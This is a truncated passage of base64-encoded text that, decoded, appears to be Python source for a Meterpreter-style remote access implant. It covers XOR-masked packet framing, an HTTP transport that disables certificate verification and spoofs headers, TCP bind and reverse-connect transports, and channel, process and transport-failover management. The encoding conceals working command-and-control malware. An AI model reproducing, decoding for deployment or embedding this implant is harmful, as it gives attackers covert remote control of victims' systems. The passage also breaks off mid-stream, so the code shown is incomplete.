gTm9uZToKICAgICAgICAgICAgcmV0dXJuIE5vbmUKICAgICAgICBzZWxmLmNvbW11bmljYXRpb25fbGFzdCA9IHRpbWUudGltZSgpCiAgICAgICAgcmV0dXJuIHBrdAoKICAgIGRlZiBlbmNyeXB0X3BhY2tldChzZWxmLCBwa3QpOgogICAgICAgICMgVGhlIHBhY2tldCBub3cgaGFzIHRvIGNvbnRhaW4gc2Vzc2lvbiBHVUlEIGFuZCBlbmNyeXB0aW9uIGZsYWcgaW5mbwogICAgICAgICMgQW5kIGdpdmVuIHRoYXQgd2UncmUgbm90IHlldCBzdXBwb3J0aW5nIEFFUywgd2UncmUgZ29pbmcgdG8ganVzdAogICAgICAgICMgYWx3YXlzIHJldHVybiB0aGUgc2Vzc2lvbiBndWlkIGFuZCB0aGUgZW5jcnlwdGlvbiBmbGFnIHNldCB0byAwCiAgICAgICAgIyBUT0RPOiB3ZSdsbCBhZGQgZW5jcnlwdGlvbiBzb29uIQogICAgICAgIHhvcl9rZXkgPSByYW5kX3hvcl9rZXkoKQogICAgICAgIHJhdyA9IGJpbmFzY2lpLmEyYl9oZXgoYnl0ZXMoU0VTU0lPTl9HVUlELCAnVVRGLTgnKSkgKyBzdHJ1Y3QucGFjaygnPkknLCBFTkNfTk9ORSkgKyBwa3QKICAgICAgICByZXN1bHQgPSBzdHJ1Y3QucGFjaygnQkJCQicsICp4b3Jfa2V5KSArIHhvcl9ieXRlcyh4b3Jfa2V5LCByYXcpCiAgICAgICAgcmV0dXJuIHJlc3VsdAoKICAgIGRlZiBzZW5kX3BhY2tldChzZWxmLCBwa3QpOgogICAgICAgIHBrdCA9IHN0cnVjdC5wYWNrKCc+SScsIGxlbihwa3QpICsgNCkgKyBwa3QKICAgICAgICBzZWxmLnJlcXVlc3RfcmV0aXJlID0gRmFsc2UKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNlbGYuX3NlbmRfcGFja2V0KHNlbGYuZW5jcnlwdF9wYWNrZXQocGt0KSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIGRlYnVnX3RyYWNlYmFjaygpCiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIHNlbGYuY29tbXVuaWNhdGlvbl9sYXN0ID0gdGltZS50aW1lKCkKICAgICAgICByZXR1cm4gVHJ1ZQoKICAgIGRlZiB0bHZfcGFja190aW1lb3V0cyhzZWxmKToKICAgICAgICByZXNwb25zZSAgPSB0bHZfcGFjayhUTFZfVFlQRV9UUkFOU19DT01NX1RJTUVPVVQsIHNlbGYuY29tbXVuaWNhdGlvbl90aW1lb3V0KQogICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX1RSQU5TX1JFVFJZX1RPVEFMLCBzZWxmLnJldHJ5X3RvdGFsKQogICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX1RSQU5TX1JFVFJZX1dBSVQsIHNlbGYucmV0cnlfd2FpdCkKICAgICAgICByZXR1cm4gcmVzcG9uc2UKCiAgICBkZWYgdGx2X3BhY2tfdHJhbnNwb3J0X2dyb3VwKHNlbGYpOgogICAgICAgIHRyYW5zX2dyb3VwICA9IHRsdl9wYWNrKFRMVl9UWVBFX1RSQU5TX1VSTCwgc2VsZi51cmwpCiAgICAgICAgdHJhbnNfZ3JvdXAgKz0gc2VsZi50bHZfcGFja190aW1lb3V0cygpCiAgICAgICAgcmV0dXJuIHRyYW5zX2dyb3VwCgpjbGFzcyBIdHRwVHJhbnNwb3J0KFRyYW5zcG9ydCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgdXJsLCBwcm94eT1Ob25lLCB1c2VyX2FnZW50PU5vbmUsIGh0dHBfaG9zdD1Ob25lLCBodHRwX3JlZmVyZXI9Tm9uZSwgaHR0cF9jb29raWU9Tm9uZSk6CiAgICAgICAgc3VwZXIoSHR0cFRyYW5zcG9ydCwgc2VsZikuX19pbml0X18oKQogICAgICAgIG9wZW5lcl9hcmdzID0gW10KICAgICAgICBzY2hlbWUgPSB1cmwuc3BsaXQoJzonLCAxKVswXQogICAgICAgIGlmIHNjaGVtZSA9PSAnaHR0cHMnIGFuZCAoKHN5cy52ZXJzaW9uX2luZm9bMF0gPT0gMiBhbmQgc3lzLnZlcnNpb25faW5mbyA+PSAoMiwgNywgOSkpIG9yIHN5cy52ZXJzaW9uX2luZm8gPj0gKDMsIDQsIDMpKToKICAgICAgICAgICAgaW1wb3J0IHNzbAogICAgICAgICAgICBzc2xfY3R4ID0gc3NsLlNTTENvbnRleHQoc3NsLlBST1RPQ09MX1NTTHYyMykKICAgICAgICAgICAgc3NsX2N0eC5jaGVja19ob3N0bmFtZSA9IEZhbHNlCiAgICAgICAgICAgIHNzbF9jdHgudmVyaWZ5X21vZGUgPSBzc2wuQ0VSVF9OT05FCiAgICAgICAgICAgIG9wZW5lcl9hcmdzLmFwcGVuZCh1cmxsaWIuSFRUUFNIYW5kbGVyKDAsIHNzbF9jdHgpKQogICAgICAgIGlmIHByb3h5OgogICAgICAgICAgICBvcGVuZXJfYXJncy5hcHBlbmQodXJsbGliLlByb3h5SGFuZGxlcih7c2NoZW1lOiBwcm94eX0pKQogICAgICAgIHNlbGYucHJveHkgPSBwcm94eQogICAgICAgIG9wZW5lciA9IHVybGxpYi5idWlsZF9vcGVuZXIoKm9wZW5lcl9hcmdzKQogICAgICAgIG9wZW5lci5hZGRoZWFkZXJzID0gW10KICAgICAgICBpZiB1c2VyX2FnZW50OgogICAgICAgICAgICBvcGVuZXIuYWRkaGVhZGVycy5hcHBlbmQoKCdVc2VyLUFnZW50JywgdXNlcl9hZ2VudCkpCiAgICAgICAgaWYgaHR0cF9jb29raWU6CiAgICAgICAgICAgIG9wZW5lci5hZGRoZWFkZXJzLmFwcGVuZCgoJ0Nvb2tpZScsIGh0dHBfY29va2llKSkKICAgICAgICBpZiBodHRwX3JlZmVyZXI6CiAgICAgICAgICAgIG9wZW5lci5hZGRoZWFkZXJzLmFwcGVuZCgoJ1JlZmVyZXInLCBodHRwX3JlZmVyZXIpKQogICAgICAgIHNlbGYudXNlcl9hZ2VudCA9IHVzZXJfYWdlbnQKICAgICAgICB1cmxsaWIuaW5zdGFsbF9vcGVuZXIob3BlbmVyKQogICAgICAgIHNlbGYudXJsID0gdXJsCiAgICAgICAgc2VsZi5faHR0cF9yZXF1ZXN0X2hlYWRlcnMgPSB7J0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nfQogICAgICAgIGlmIGh0dHBfaG9zdDoKICAgICAgICAgICAgc2VsZi5faHR0cF9yZXF1ZXN0X2hlYWRlcnNbJ0hvc3QnXSA9IGh0dHBfaG9zdAogICAgICAgIHNlbGYuX2ZpcnN0X3BhY2tldCA9IE5vbmUKICAgICAgICBzZWxmLl9lbXB0eV9jbnQgPSAwCgogICAgZGVmIF9hY3RpdmF0ZShzZWxmKToKICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgIHNlbGYuX2ZpcnN0X3BhY2tldCA9IE5vbmUKICAgICAgICBwYWNrZXQgPSBzZWxmLl9nZXRfcGFja2V0KCkKICAgICAgICBpZiBwYWNrZXQgaXMgTm9uZToKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgc2VsZi5fZmlyc3RfcGFja2V0ID0gcGFja2V0CiAgICAgICAgcmV0dXJuIFRydWUKCiAgICBkZWYgX2dldF9wYWNrZXQoc2VsZik6CiAgICAgICAgaWYgc2VsZi5fZmlyc3RfcGFja2V0OgogICAgICAgICAgICBwYWNrZXQgPSBzZWxmLl9maXJzdF9wYWNrZXQKICAgICAgICAgICAgc2VsZi5fZmlyc3RfcGFja2V0ID0gTm9uZQogICAgICAgICAgICByZXR1cm4gcGFja2V0CiAgICAgICAgcGFja2V0ID0gTm9uZQogICAgICAgIHhvcl9rZXkgPSBOb25lCiAgICAgICAgcmVxdWVzdCA9IHVybGxpYi5SZXF1ZXN0KHNlbGYudXJsLCBOb25lLCBzZWxmLl9odHRwX3JlcXVlc3RfaGVhZGVycykKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybF9oID0gdXJsbGliLnVybG9wZW4ocmVxdWVzdCwgdGltZW91dD1zZWxmLmNvbW11bmljYXRpb25fdGltZW91dCkKICAgICAgICAgICAgcGFja2V0ID0gdXJsX2gucmVhZCgpCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKDEpOgogICAgICAgICAgICAgICAgaWYgcGFja2V0ID09ICcnOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBpZiBsZW4ocGFja2V0KSA8IFBBQ0tFVF9IRUFERVJfU0laRToKICAgICAgICAgICAgICAgICAgICBwYWNrZXQgPSBOb25lICAjIGxvb2tzIGNvcnJ1cHQKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgeG9yX2tleSA9IHN0cnVjdC51bnBhY2soJ0JCQkInLCBwYWNrZXRbOlBBQ0tFVF9YT1JfS0VZX1NJWkVdKQogICAgICAgICAgICAgICAgaGVhZGVyID0geG9yX2J5dGVzKHhvcl9rZXksIHBhY2tldFs6UEFDS0VUX0hFQURFUl9TSVpFXSkKICAgICAgICAgICAgICAgIHBrdF9sZW5ndGggPSBzdHJ1Y3QudW5wYWNrKCc+SScsIGhlYWRlcltQQUNLRVRfTEVOR1RIX09GRjpQQUNLRVRfTEVOR1RIX09GRitQQUNLRVRfTEVOR1RIX1NJWkVdKVswXSAtIDgKICAgICAgICAgICAgICAgIGlmIGxlbihwYWNrZXQpICE9IChwa3RfbGVuZ3RoICsgUEFDS0VUX0hFQURFUl9TSVpFKToKICAgICAgICAgICAgICAgICAgICBwYWNrZXQgPSBOb25lICAjIGxvb2tzIGNvcnJ1cHQKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIGRlYnVnX3RyYWNlYmFjaygnRmFpbHVyZSB0byByZWNlaXZlIHBhY2tldCBmcm9tICcgKyBzZWxmLnVybCkKCiAgICAgICAgaWYgbm90IHBhY2tldDoKICAgICAgICAgICAgZGVsYXkgPSAxMCAqIHNlbGYuX2VtcHR5X2NudAogICAgICAgICAgICBpZiBzZWxmLl9lbXB0eV9jbnQgPj0gMDoKICAgICAgICAgICAgICAgIGRlbGF5ICo9IDEwCiAgICAgICAgICAgIHNlbGYuX2VtcHR5X2NudCArPSAxCiAgICAgICAgICAgIHRpbWUuc2xlZXAoZmxvYXQobWluKDEwMDAwLCBkZWxheSkpIC8gMTAwMCkKICAgICAgICAgICAgcmV0dXJuIHBhY2tldAoKICAgICAgICBzZWxmLl9lbXB0eV9jbnQgPSAwCiAgICAgICAgcmV0dXJuIHBhY2tldAoKICAgIGRlZiBfc2VuZF9wYWNrZXQoc2VsZiwgcGFja2V0KToKICAgICAgICByZXF1ZXN0ID0gdXJsbGliLlJlcXVlc3Qoc2VsZi51cmwsIHBhY2tldCwgc2VsZi5faHR0cF9yZXF1ZXN0X2hlYWRlcnMpCiAgICAgICAgdXJsX2ggPSB1cmxsaWIudXJsb3BlbihyZXF1ZXN0LCB0aW1lb3V0PXNlbGYuY29tbXVuaWNhdGlvbl90aW1lb3V0KQogICAgICAgIHJlc3BvbnNlID0gdXJsX2gucmVhZCgpCgogICAgZGVmIHBhdGNoX3VyaV9wYXRoKHNlbGYsIG5ld19wYXRoKToKICAgICAgICBtYXRjaCA9IHJlLm1hdGNoKHInaHR0cHM/Oi8vW14vXSsoLy4qJCknLCBzZWxmLnVybCkKICAgICAgICBpZiBtYXRjaCBpcyBOb25lOgogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICBzZWxmLnVybCA9IHNlbGYudXJsWzptYXRjaC5zcGFuKDEpWzBdXSArIG5ld19wYXRoCiAgICAgICAgcmV0dXJuIFRydWUKCiAgICBkZWYgdGx2X3BhY2tfdHJhbnNwb3J0X2dyb3VwKHNlbGYpOgogICAgICAgIHRyYW5zX2dyb3VwICA9IHN1cGVyKEh0dHBUcmFuc3BvcnQsIHNlbGYpLnRsdl9wYWNrX3RyYW5zcG9ydF9ncm91cCgpCiAgICAgICAgaWYgc2VsZi51c2VyX2FnZW50OgogICAgICAgICAgICB0cmFuc19ncm91cCArPSB0bHZfcGFjayhUTFZfVFlQRV9UUkFOU19VQSwgc2VsZi51c2VyX2FnZW50KQogICAgICAgIGlmIHNlbGYucHJveHk6CiAgICAgICAgICAgIHRyYW5zX2dyb3VwICs9IHRsdl9wYWNrKFRMVl9UWVBFX1RSQU5TX1BST1hZX0hPU1QsIHNlbGYucHJveHkpCiAgICAgICAgcmV0dXJuIHRyYW5zX2dyb3VwCgpjbGFzcyBUY3BUcmFuc3BvcnQoVHJhbnNwb3J0KToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCB1cmwsIHNvY2tldD1Ob25lKToKICAgICAgICBzdXBlcihUY3BUcmFuc3BvcnQsIHNlbGYpLl9faW5pdF9fKCkKICAgICAgICBzZWxmLnVybCA9IHVybAogICAgICAgIHNlbGYuc29ja2V0ID0gc29ja2V0CiAgICAgICAgc2VsZi5fY2xlYW51cF90aHJlYWQgPSBOb25lCiAgICAgICAgc2VsZi5fZmlyc3RfcGFja2V0ID0gVHJ1ZQoKICAgIGRlZiBfc29ja19jbGVhbnVwKHNlbGYsIHNvY2spOgogICAgICAgIHJlbWFpbmluZ190aW1lID0gc2VsZi5jb21tdW5pY2F0aW9uX3RpbWVvdXQKICAgICAgICB3aGlsZSByZW1haW5pbmdfdGltZSA+IDA6CiAgICAgICAgICAgIGl0ZXJfc3RhcnRfdGltZSA9IHRpbWUudGltZSgpCiAgICAgICAgICAgIGlmIHNlbGVjdC5zZWxlY3QoW3NvY2tdLCBbXSwgW10sIHJlbWFpbmluZ190aW1lKVswXToKICAgICAgICAgICAgICAgIGlmIGxlbihzb2NrLnJlY3YoNDA5NikpID09IDA6CiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgcmVtYWluaW5nX3RpbWUgLT0gdGltZS50aW1lKCkgLSBpdGVyX3N0YXJ0X3RpbWUKICAgICAgICBzb2NrLmNsb3NlKCkKCiAgICBkZWYgX2FjdGl2YXRlKHNlbGYpOgogICAgICAgIGFkZHJlc3MsIHBvcnQgPSBzZWxmLnVybFs2Ol0ucnNwbGl0KCc6JywgMSkKICAgICAgICBwb3J0ID0gaW50KHBvcnQucnN0cmlwKCcvJykpCiAgICAgICAgdGltZW91dCA9IG1heChzZWxmLmNvbW11bmljYXRpb25fdGltZW91dCwgMzApCiAgICAgICAgaWYgYWRkcmVzcyBpbiAoJycsICcwLjAuMC4wJywgJzo6Jyk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlcnZlcl9zb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVDYsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgICAgIHNlcnZlcl9zb2NrLnNldHNvY2tvcHQoc29ja2V0LklQUFJPVE9fSVBWNiwgc29ja2V0LklQVjZfVjZPTkxZLCAwKQogICAgICAgICAgICBleGNlcHQgKEF0dHJpYnV0ZUVycm9yLCBzb2NrZXQuZXJyb3IpOgogICAgICAgICAgICAgICAgc2VydmVyX3NvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgICAgIHNlcnZlcl9zb2NrLmJpbmQoKCcnLCBwb3J0KSkKICAgICAgICAgICAgc2VydmVyX3NvY2subGlzdGVuKDEpCiAgICAgICAgICAgIGlmIG5vdCBzZWxlY3Quc2VsZWN0KFtzZXJ2ZXJfc29ja10sIFtdLCBbXSwgdGltZW91dClbMF06CiAgICAgICAgICAgICAgICBzZXJ2ZXJfc29jay5jbG9zZSgpCiAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICAgICAgc29jaywgXyA9IHNlcnZlcl9zb2NrLmFjY2VwdCgpCiAgICAgICAgICAgIHNlcnZlcl9zb2NrLmNsb3NlKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAnOicgaW4gYWRkcmVzczoKICAgICAgICAgICAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUNiwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgc29jay5zZXR0aW1lb3V0KHRpbWVvdXQpCiAgICAgICAgICAgIHNvY2suY29ubmVjdCgoYWRkcmVzcywgcG9ydCkpCiAgICAgICAgICAgIHNvY2suc2V0dGltZW91dChOb25lKQogICAgICAgIHNlbGYuc29ja2V0ID0gc29jawogICAgICAgIHNlbGYuX2ZpcnN0X3BhY2tldCA9IFRydWUKICAgICAgICByZXR1cm4gVHJ1ZQoKICAgIGRlZiBfZGVhY3RpdmF0ZShzZWxmKToKICAgICAgICBjbGVhbnVwID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5fc29ja19jbGVhbnVwLCBhcmdzPShzZWxmLnNvY2tldCwpKQogICAgICAgIGNsZWFudXAucnVuKCkKICAgICAgICBzZWxmLnNvY2tldCA9IE5vbmUKCiAgICBkZWYgX2dldF9wYWNrZXQoc2VsZik6CiAgICAgICAgZmlyc3QgPSBzZWxmLl9maXJzdF9wYWNrZXQKICAgICAgICBzZWxmLl9maXJzdF9wYWNrZXQgPSBGYWxzZQogICAgICAgIGlmIG5vdCBzZWxlY3Quc2VsZWN0KFtzZWxmLnNvY2tldF0sIFtdLCBbXSwgMC41KVswXToKICAgICAgICAgICAgcmV0dXJuIGJ5dGVzKCkKICAgICAgICBwYWNrZXQgPSBzZWxmLnNvY2tldC5yZWN2KFBBQ0tFVF9IRUFERVJfU0laRSkKICAgICAgICBpZiBwYWNrZXQgPT0gJyc6ICAjIHJlbW90ZSBpcyBjbG9zZWQKICAgICAgICAgICAgc2VsZi5yZXF1ZXN0X3JldGlyZSA9IFRydWUKICAgICAgICAgICAgcmV0dXJuIE5vbmUKICAgICAgICBpZiBsZW4ocGFja2V0KSAhPSBQQUNLRVRfSEVBREVSX1NJWkU6CiAgICAgICAgICAgIGlmIGZpcnN0IGFuZCBsZW4ocGFja2V0KSA9PSA0OgogICAgICAgICAgICAgICAgcmVjZWl2ZWQgPSAwCiAgICAgICAgICAgICAgICBoZWFkZXIgPSBwYWNrZXRbOjRdCiAgICAgICAgICAgICAgICBwa3RfbGVuZ3RoID0gc3RydWN0LnVucGFjaygnPkknLCBoZWFkZXIpWzBdCiAgICAgICAgICAgICAgICBzZWxmLnNvY2tldC5zZXR0aW1lb3V0KG1heChzZWxmLmNvbW11bmljYXRpb25fdGltZW91dCwgMzApKQogICAgICAgICAgICAgICAgd2hpbGUgcmVjZWl2ZWQgPCBwa3RfbGVuZ3RoOgogICAgICAgICAgICAgICAgICAgIHJlY2VpdmVkICs9IGxlbihzZWxmLnNvY2tldC5yZWN2KHBrdF9sZW5ndGggLSByZWNlaXZlZCkpCiAgICAgICAgICAgICAgICBzZWxmLnNvY2tldC5zZXR0aW1lb3V0KE5vbmUpCiAgICAgICAgICAgICAgICByZXR1cm4gc2VsZi5fZ2V0X3BhY2tldCgpCiAgICAgICAgICAgIHJldHVybiBOb25lCgogICAgICAgIHhvcl9rZXkgPSBzdHJ1Y3QudW5wYWNrKCdCQkJCJywgcGFja2V0WzpQQUNLRVRfWE9SX0tFWV9TSVpFXSkKICAgICAgICAjIFhPUiB0aGUgd2hvbGUgaGVhZGVyIGZpcnN0CiAgICAgICAgaGVhZGVyID0geG9yX2J5dGVzKHhvcl9rZXksIHBhY2tldFs6UEFDS0VUX0hFQURFUl9TSVpFXSkKICAgICAgICAjIEV4dHJhY3QganVzdCB0aGUgbGVuZ3RoCiAgICAgICAgcGt0X2xlbmd0aCA9IHN0cnVjdC51bnBhY2soJz5JJywgaGVhZGVyW1BBQ0tFVF9MRU5HVEhfT0ZGOlBBQ0tFVF9MRU5HVEhfT0ZGK1BBQ0tFVF9MRU5HVEhfU0laRV0pWzBdCiAgICAgICAgcGt0X2xlbmd0aCAtPSA4CiAgICAgICAgIyBSZWFkIHRoZSByZXN0IG9mIHRoZSBwYWNrZXQKICAgICAgICByZXN0ID0gYnl0ZXMoKQogICAgICAgIHdoaWxlIGxlbihyZXN0KSA8IHBrdF9sZW5ndGg6CiAgICAgICAgICAgIHJlc3QgKz0gc2VsZi5zb2NrZXQucmVjdihwa3RfbGVuZ3RoIC0gbGVuKHJlc3QpKQogICAgICAgICMgcmV0dXJuIHRoZSB3aG9sZSBwYWNrZXQsIGFzIGl0J3MgZGVjb2RlZCBzZXBhcmF0ZWx5CiAgICAgICAgcmV0dXJuIHBhY2tldCArIHJlc3QKCiAgICBkZWYgX3NlbmRfcGFja2V0KHNlbGYsIHBhY2tldCk6CiAgICAgICAgc2VsZi5zb2NrZXQuc2VuZChwYWNrZXQpCgogICAgQGNsYXNzbWV0aG9kCiAgICBkZWYgZnJvbV9zb2NrZXQoY2xzLCBzb2NrKToKICAgICAgICB1cmwgPSAndGNwOi8vJwogICAgICAgIGFkZHJlc3MsIHBvcnQgPSBzb2NrLmdldHNvY2tuYW1lKClbOjJdCiAgICAgICAgIyB0aGlzIHdpbGwgbmVlZCB0byBiZSBjaGFuZ2VkIGlmIHRoZSBiaW5kIHN0YWdlciBldmVyIHN1cHBvcnRzIGJpbmRpbmcgdG8gYSBzcGVjaWZpYyBhZGRyZXNzCiAgICAgICAgaWYgbm90IGFkZHJlc3MgaW4gKCcnLCAnMC4wLjAuMCcsICc6OicpOgogICAgICAgICAgICBhZGRyZXNzLCBwb3J0ID0gc29jay5nZXRwZWVybmFtZSgpWzoyXQogICAgICAgIHVybCArPSBhZGRyZXNzICsgJzonICsgc3RyKHBvcnQpCiAgICAgICAgcmV0dXJuIGNscyh1cmwsIHNvY2spCgpjbGFzcyBQeXRob25NZXRlcnByZXRlcihvYmplY3QpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHRyYW5zcG9ydCk6CiAgICAgICAgc2VsZi50cmFuc3BvcnQgPSB0cmFuc3BvcnQKICAgICAgICBzZWxmLl90cmFuc3BvcnRfc2xlZXAgPSBOb25lCiAgICAgICAgc2VsZi5ydW5uaW5nID0gRmFsc2UKICAgICAgICBzZWxmLmxhc3RfcmVnaXN0ZXJlZF9leHRlbnNpb24gPSBOb25lCiAgICAgICAgc2VsZi5leHRlbnNpb25fZnVuY3Rpb25zID0ge30KICAgICAgICBzZWxmLmNoYW5uZWxzID0ge30KICAgICAgICBzZWxmLm5leHRfY2hhbm5lbF9pZCA9IDEKICAgICAgICBzZWxmLmludGVyYWN0X2NoYW5uZWxzID0gW10KICAgICAgICBzZWxmLnByb2Nlc3NlcyA9IHt9CiAgICAgICAgc2VsZi5uZXh0X3Byb2Nlc3NfaWQgPSAxCiAgICAgICAgc2VsZi50cmFuc3BvcnRzID0gW3NlbGYudHJhbnNwb3J0XQogICAgICAgIHNlbGYuc2Vzc2lvbl9leHBpcnlfdGltZSA9IFNFU1NJT05fRVhQSVJBVElPTl9USU1FT1VUCiAgICAgICAgc2VsZi5zZXNzaW9uX2V4cGlyeV9lbmQgPSB0aW1lLnRpbWUoKSArIHNlbGYuc2Vzc2lvbl9leHBpcnlfdGltZQogICAgICAgIGZvciBmdW5jIGluIGxpc3QoZmlsdGVyKGxhbWJkYSB4OiB4LnN0YXJ0c3dpdGgoJ19jb3JlJyksIGRpcihzZWxmKSkpOgogICAgICAgICAgICBzZWxmLmV4dGVuc2lvbl9mdW5jdGlvbnNbZnVuY1sxOl1dID0gZ2V0YXR0cihzZWxmLCBmdW5jKQogICAgICAgIHNlbGYucnVubmluZyA9IFRydWUKCiAgICBkZWYgcmVnaXN0ZXJfZXh0ZW5zaW9uKHNlbGYsIGV4dGVuc2lvbl9uYW1lKToKICAgICAgICBzZWxmLmxhc3RfcmVnaXN0ZXJlZF9leHRlbnNpb24gPSBleHRlbnNpb25fbmFtZQogICAgICAgIHJldHVybiBzZWxmLmxhc3RfcmVnaXN0ZXJlZF9leHRlbnNpb24KCiAgICBkZWYgcmVnaXN0ZXJfZnVuY3Rpb24oc2VsZiwgZnVuYyk6CiAgICAgICAgc2VsZi5leHRlbnNpb25fZnVuY3Rpb25zW2Z1bmMuX19uYW1lX19dID0gZnVuYwogICAgICAgIHJldHVybiBmdW5jCgogICAgZGVmIHJlZ2lzdGVyX2Z1bmN0aW9uX2lmKHNlbGYsIGNvbmRpdGlvbik6CiAgICAgICAgaWYgY29uZGl0aW9uOgogICAgICAgICAgICByZXR1cm4gc2VsZi5yZWdpc3Rlcl9mdW5jdGlvbgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybiBsYW1iZGEgZnVuY3Rpb246IGZ1bmN0aW9uCgogICAgZGVmIHJlZ2lzdGVyX2Z1bmN0aW9uX3dpbmRsbChzZWxmLCBmdW5jKToKICAgICAgICBpZiBoYXNfd2luZGxsOgogICAgICAgICAgICBzZWxmLnJlZ2lzdGVyX2Z1bmN0aW9uKGZ1bmMpCiAgICAgICAgcmV0dXJuIGZ1bmMKCiAgICBkZWYgYWRkX2NoYW5uZWwoc2VsZiwgY2hhbm5lbCk6CiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoY2hhbm5lbCwgTWV0ZXJwcmV0ZXJDaGFubmVsKToKICAgICAgICAgICAgZGVidWdfcHJpbnQoJ1stXSBjaGFubmVsIG9iamVjdCBpcyBub3QgYW4gaW5zdGFuY2Ugb2YgTWV0ZXJwcmV0ZXJDaGFubmVsJykKICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCdpbnZhbGlkIGNoYW5uZWwgb2JqZWN0JykKICAgICAgICBpZHggPSBzZWxmLm5leHRfY2hhbm5lbF9pZAogICAgICAgIHNlbGYuY2hhbm5lbHNbaWR4XSA9IGNoYW5uZWwKICAgICAgICBkZWJ1Z19wcmludCgnWypdIGFkZGVkIGNoYW5uZWwgaWQ6ICcgKyBzdHIoaWR4KSArICcgdHlwZTogJyArIGNoYW5uZWwuX19jbGFzc19fLl9fbmFtZV9fKQogICAgICAgIHNlbGYubmV4dF9jaGFubmVsX2lkICs9IDEKICAgICAgICByZXR1cm4gaWR4CgogICAgZGVmIGFkZF9wcm9jZXNzKHNlbGYsIHByb2Nlc3MpOgogICAgICAgIGlkeCA9IHNlbGYubmV4dF9wcm9jZXNzX2lkCiAgICAgICAgc2VsZi5wcm9jZXNzZXNbaWR4XSA9IHByb2Nlc3MKICAgICAgICBkZWJ1Z19wcmludCgnWypdIGFkZGVkIHByb2Nlc3MgaWQ6ICcgKyBzdHIoaWR4KSkKICAgICAgICBzZWxmLm5leHRfcHJvY2Vzc19pZCArPSAxCiAgICAgICAgcmV0dXJuIGlkeAoKICAgIGRlZiBnZXRfcGFja2V0KHNlbGYpOgogICAgICAgIHBrdCA9IHNlbGYudHJhbnNwb3J0LmdldF9wYWNrZXQoKQogICAgICAgIGlmIHBrdCBpcyBOb25lIGFuZCBzZWxmLnRyYW5zcG9ydC5zaG91bGRfcmV0aXJlOgogICAgICAgICAgICBzZWxmLnRyYW5zcG9ydF9jaGFuZ2UoKQogICAgICAgIHJldHVybiBwa3QKCiAgICBkZWYgc2VuZF9wYWNrZXQoc2VsZiwgcGFja2V0KToKICAgICAgICBzZW5kX3N1Y2NlZWRlZCA9IHNlbGYudHJhbnNwb3J0LnNlbmRfcGFja2V0KHBhY2tldCkKICAgICAgICBpZiBub3Qgc2VuZF9zdWNjZWVkZWQgYW5kIHNlbGYudHJhbnNwb3J0LnNob3VsZF9yZXRpcmU6CiAgICAgICAgICAgIHNlbGYudHJhbnNwb3J0X2NoYW5nZSgpCiAgICAgICAgcmV0dXJuIHNlbmRfc3VjY2VlZGVkCgogICAgQHByb3BlcnR5CiAgICBkZWYgc2Vzc2lvbl9oYXNfZXhwaXJlZChzZWxmKToKICAgICAgICBpZiBzZWxmLnNlc3Npb25fZXhwaXJ5X3RpbWUgPT0gMDoKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgcmV0dXJuIHRpbWUudGltZSgpID4gc2VsZi5zZXNzaW9uX2V4cGlyeV9lbmQKCiAgICBkZWYgdHJhbnNwb3J0X2FkZChzZWxmLCBuZXdfdHJhbnNwb3J0KToKICAgICAgICBuZXdfcG9zaXRpb24gPSBzZWxmLnRyYW5zcG9ydHMuaW5kZXgoc2VsZi50cmFuc3BvcnQpCiAgICAgICAgc2VsZi50cmFuc3BvcnRzLmluc2VydChuZXdfcG9zaXRpb24sIG5ld190cmFuc3BvcnQpCgogICAgZGVmIHRyYW5zcG9ydF9jaGFuZ2Uoc2VsZiwgbmV3X3RyYW5zcG9ydD1Ob25lKToKICAgICAgICBpZiBuZXdfdHJhbnNwb3J0IGlzIE5vbmU6CiAgICAgICAgICAgIG5ld190cmFuc3BvcnQgPSBzZWxmLnRyYW5zcG9ydF9uZXh0KCkKICAgICAgICBzZWxmLnRyYW5zcG9ydC5kZWFjdGl2YXRlKCkKICAgICAgICBkZWJ1Z19wcmludCgnWypdIGNoYW5naW5nIHRyYW5zcG9ydCB0bzogJyArIG5ld190cmFuc3BvcnQudXJsKQogICAgICAgIHdoaWxlIG5vdCBuZXdfdHJhbnNwb3J0LmFjdGl2YXRlKCk6CiAgICAgICAgICAgIG5ld190cmFuc3BvcnQgPSBzZWxmLnRyYW5zcG9ydF9uZXh0KG5ld190cmFuc3BvcnQpCiAgICAgICAgICAgIGRl